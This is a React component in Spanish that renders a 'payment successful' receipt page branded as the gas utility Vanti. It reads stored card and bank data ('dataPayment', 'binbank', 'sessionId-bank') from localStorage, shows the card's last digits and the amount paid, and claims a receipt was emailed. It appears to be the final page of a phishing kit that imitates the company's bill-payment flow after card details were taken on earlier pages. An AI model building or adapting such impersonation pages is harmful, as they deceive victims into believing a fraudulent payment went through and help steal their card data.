/* eslint-disable react-hooks/set-state-in-effect */
/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable @next/next/no-img-element */
"use client";
import React, { useEffect, useState } from "react";

// -------------------------------------------------------------
// Cargar confetti dinámicamente
// -------------------------------------------------------------
const loadConfettiAndFire = () => {
  const fireConfetti = () => {
    const confettiFn = (window as any).confetti;
    if (confettiFn) {
      confettiFn({
        particleCount: 80,
        spread: 60,
        colors: ['#003366', '#00aeef', '#ffffff'], // Colores Vanti
        origin: { y: 0.6 }
      });
    }
  };

  if ((window as any).confetti) {
    fireConfetti();
    return;
  }

  const scriptId = "confetti-script";
  if (!document.getElementById(scriptId)) {
    const script = document.createElement("script");
    script.id = scriptId;
    script.src = "https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.3/dist/confetti.browser.min.js";
    script.onload = () => setTimeout(fireConfetti, 80);
    document.body.appendChild(script);
  }
};

const ExitoVanti = () => {
  const [paymentData, setPaymentData] = useState<any>(null);

  const getLocal = (key: string, fallback: any = null) => {
    if (typeof window === "undefined") return fallback;
    const value = localStorage.getItem(key);
    try {
      return value ? JSON.parse(value) : fallback;
    } catch {
      return value || fallback;
    }
  };

  useEffect(() => {
    const binbank = getLocal("binbank");
    const cardPaymentData = getLocal("dataPayment");

    const sessionidBank = localStorage.getItem("sessionId-bank") || "VNT-000000";

    setPaymentData({
      reference: sessionidBank.substring(0, 10).toUpperCase(),
      service: "Pago de Factura Gas Natural",
      amount: `$${cardPaymentData?.formData?.valor.toLocaleString("es-CO")}`,
      lastDigits: cardPaymentData?.number?.slice(-4) || "****",
      bankName: cardPaymentData?.banco || "Entidad Bancaria",
      qrData: `https://www.grupovanti.com/consultar-factura`
    });

    setTimeout(loadConfettiAndFire, 400);
  }, []);

  return (
    <div className="min-h-screen bg-[#F4F7F9] flex justify-center items-start p-4 md:p-8 font-sans">
      <div className="w-full max-w-xl">

        {/* ---------------- HEADER VANTI ---------------- */}
        <header className="flex items-center justify-between bg-white p-5 rounded-t-2xl shadow-sm border-b border-gray-100">
          <img
            alt="Logo Vanti"
            className="h-10 w-auto"
            src="/vanti-logo.png"
          />
          <span className="text-[#003366] font-bold text-sm">Transacción Exitosa</span>
        </header>

        {/* ---------------- CONTENIDO PRINCIPAL ---------------- */}
        <main className="bg-white p-8 rounded-b-2xl shadow-xl text-center">

          <div className="flex justify-center mb-6">
            <div className="bg-[#E6F4FD] p-4 rounded-full">
              <svg
                className="h-12 w-12 text-[#00AEEF]"
                xmlns="http://www.w3.org/2000/svg"
                fill="none"
                viewBox="0 0 24 24"
                strokeWidth={2.5}
                stroke="currentColor"
              >
                <path strokeLinecap="round" strokeLinejoin="round" d="m4.5 12.75 6 6 9-13.5" />
              </svg>
            </div>
          </div>

          <h1 className="text-2xl sm:text-3xl font-extrabold text-[#003366] mb-2">
            ¡Pago Realizado con Éxito!
          </h1>
          <p className="text-gray-500 mb-8 max-w-sm mx-auto">
            Hemos procesado tu pago satisfactoriamente. Tu soporte de pago ha sido enviado a tu correo electrónico.
          </p>

          {/* ---------------- INFO DE LA TRANSACCIÓN ---------------- */}
          {paymentData && (
            <div className="bg-gray-50 rounded-xl p-6 border border-gray-200 mb-8">
              <div className="flex flex-col items-center mb-6">
                <div className="bg-white p-3 rounded-lg shadow-sm border border-gray-100">
                  <img
                    alt="QR Soporte"
                    className="w-28 h-28"
                    src={`https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(paymentData.qrData)}`}
                  />
                </div>
                <p className="text-[10px] text-gray-400 mt-2 uppercase tracking-widest">Validación Digital Vanti</p>
              </div>

              <div className="space-y-4 text-left">
                <div className="flex justify-between items-center border-b border-gray-200 pb-2">
                  <span className="text-gray-500 text-sm font-medium">Referencia de Pago:</span>
                  <span className="text-[#003366] font-bold">{paymentData.reference}</span>
                </div>

                <div className="flex justify-between items-center border-b border-gray-200 pb-2">
                  <span className="text-gray-500 text-sm font-medium">Servicio:</span>
                  <span className="text-gray-800 font-semibold">{paymentData.service}</span>
                </div>

                <div className="flex justify-between items-center border-b border-gray-200 pb-2">
                  <span className="text-gray-500 text-sm font-medium">Banco:</span>
                  <span className="text-gray-800 font-semibold">{paymentData.bankName}</span>
                </div>

                <div className="flex justify-between items-center">
                  <span className="text-gray-500 text-sm font-medium">Valor Pagado:</span>
                  <span className="text-[#00AEEF] text-xl font-black">{paymentData.amount}</span>
                </div>
              </div>
            </div>
          )}

          {/* ---------------- ACCIONES ---------------- */}
          <div className="grid grid-cols-1 gap-3">
            <button
              onClick={() => window.print()}
              className="w-full py-3.5 bg-[#003366] hover:bg-[#002244] text-white font-bold rounded-xl transition-all shadow-lg shadow-blue-900/20"
            >
              Descargar Comprobante (PDF)
            </button>

            <a
              href="https://www.grupovanti.com"
              className="w-full py-3.5 bg-white border-2 border-[#00AEEF] text-[#00AEEF] hover:bg-[#00AEEF] hover:text-white font-bold rounded-xl transition-all inline-block"
            >
              Volver al Inicio
            </a>
          </div>

          <p className="mt-8 text-xs text-gray-400">
            Vanti S.A. ESP - Vigilado por la Superintendencia de Servicios Públicos Domiciliarios.
          </p>
        </main>
      </div>
    </div>
  );
};

export default ExitoVanti;